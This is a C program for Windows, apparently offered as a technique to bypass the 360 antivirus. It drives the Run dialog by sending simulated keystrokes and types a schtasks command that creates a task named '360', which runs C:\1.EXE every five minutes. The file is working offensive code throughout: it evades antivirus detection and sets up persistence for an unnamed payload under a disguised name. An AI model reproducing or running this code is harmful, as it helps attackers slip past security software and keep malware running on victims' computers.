#include<windows.h>
#include<stdio.h>
HWND T=NULL,Run=NULL;


BOOL CALLBACK EnumChildProc(HWND hWnd, LPARAM lParam)
{
	char temp1[256], temp2[256];
	::GetWindowText(hWnd, temp1, 255);
	GetClassName(hWnd, temp2, 255);
	//printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2,temp1);
	if (!strcmp(temp2, "Edit")) {
		printf("hwnd:%d\tclass:%s\ttext: %s\t\n", hWnd, temp2, temp1);
		HWND h = GetParent(hWnd);
		GetClassName(h, temp2, 255);
		if (!strcmp(temp2, "ComboBox")) {
			HWND h2 = GetParent((HWND)h);
			GetClassName(h2, temp2, 255);
			if (!strcmp(temp2, "#32770")) {
				T = hWnd;
				Run = h2;
			}
		}
		
	}
	return true;
}

void SMG(HWND id, char c) {
	SendMessage(id, WM_CHAR, c, 0);
}
void bypass360() {
	keybd_event(VK_LWIN, 0, 0, 0);
	keybd_event('R', 0, 0, 0);
	keybd_event('R', 0, KEYEVENTF_KEYUP, 0);
	keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
	while (T == NULL, Run == NULL) {
		EnumChildWindows(GetDesktopWindow(), EnumChildProc, 0);
	}
	if (T == NULL) {
		printf("t is null");
		return ;
	}
	Sleep(100);
	keybd_event(VK_CAPITAL, 0, 0, 0);
	SendMessage(T, WM_CHAR, VK_BACK, 0);
	SendMessage(T, WM_CHAR, 'C', 0);
	SendMessage(T, WM_CHAR, 'm', 0);
	SendMessage(T, WM_CHAR, 'd', 0);
	SendMessage(T, WM_CHAR, VK_SPACE, 0);
	SendMessage(T, WM_CHAR, '/', 0);
	SendMessage(T, WM_CHAR, 'C', 0);
	SendMessage(T, WM_CHAR, VK_SPACE, 0);
	SendMessage(T, WM_CHAR, 'T', 0);
	SendMessage(T, WM_CHAR, 'I', 0);
	SendMessage(T, WM_CHAR, 'T', 0);
	SendMessage(T, WM_CHAR, 'L', 0);
	SendMessage(T, WM_CHAR, 'E', 0);
	SendMessage(T, WM_CHAR, VK_SPACE, 0);
	SendMessage(T, WM_CHAR, 'B', 0);
	SendMessage(T, WM_CHAR, 'A', 0);
	SendMessage(T, WM_CHAR, 'K', 0);
	SendMessage(T, WM_CHAR, 'A', 0);
	SendMessage(T, WM_CHAR, 'B', 0);
	SendMessage(T, WM_CHAR, 'I', 0);
	SendMessage(T, WM_CHAR, 'E', 0);
	SendMessage(T, WM_CHAR, '&', 0);
	SendMessage(T, WM_CHAR, '&', 0);
	SendMessage(T, WM_CHAR, VK_SPACE , 0);
	SendMessage(T, WM_CHAR, 'C', 0);
	SendMessage(T, WM_CHAR, 'M', 0);
	SendMessage(T, WM_CHAR, 'D', 0);
	SendMessage(T, WM_CHAR, VK_SPACE, 0);
	SendMessage(T, WM_CHAR, 13, 0);
	PostMessage(T, WM_KEYDOWN, VK_RETURN, 0);

	HWND hq = NULL;
	while (TRUE) {
		hq = FindWindow(NULL,"BAKABIE");
		if (hq != NULL) {
			Sleep(100);
			//int r = ShowWindow(hq, SW_HIDE);
			//printf("show:%d\n", r);
			
			break;
		}
	}
	printf("cmd:%d\n",hq);
	char a[57] = { 'S','C','H','T','A'
		,'S','K','S',VK_SPACE,'/','C'
		,'R','E','A','T','E',VK_SPACE,'/',
		'S','C',VK_SPACE,'M','I','N',
		'U','T','E',VK_SPACE,'/','M','O',VK_SPACE,
		'5',VK_SPACE,'/','T','N',VK_SPACE,'3','6','0',
		VK_SPACE,'/','T','R',VK_SPACE,'C',':','\\',
		'1','.','E','X','E',VK_SPACE,'/','F'
	};
	for (int i = 0; i <= 56; i++) {
		printf("%c", a[i]);
		SMG(hq, a[i]);
	}
	SendMessage(hq, WM_CHAR, 13, 0);
	char b[5] = { 'e','x','i','t' };
	for (int i = 0; i <= 4; i++) {
		SMG(hq, b[i]);
	}
	PostMessage(hq, WM_CHAR, 13, 0);

}

int main() {

	bypass360();
	system("pause");
}